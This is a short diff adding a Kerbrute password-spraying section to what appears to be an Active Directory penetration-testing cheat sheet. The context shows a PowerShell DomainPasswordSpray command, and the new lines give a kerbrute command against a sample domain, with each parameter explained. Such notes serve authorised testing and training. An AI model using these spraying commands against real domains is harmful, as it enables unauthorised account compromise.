@@ -175,3 +175,15 @@ Get-NetUser
    ```powershell
    Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
    ```
+##### **Password Spraying Using Kerbrute**
+
+**Command to Perform Password Spraying:**
+```bash
+.\kerbrute.exe passwordspray -d corp.com domain_users.txt P@ssw0rd!
+```
+
+ **Parameters Explained:**
+- **`passwordspray`**: The action to perform.
+- **`-d corp.com`**: Specifies the target domain.
+- **`domain_users.txt`**: File containing a list of usernames.
+- **`P@ssw0rd!`**: Password to test against all users in the list.
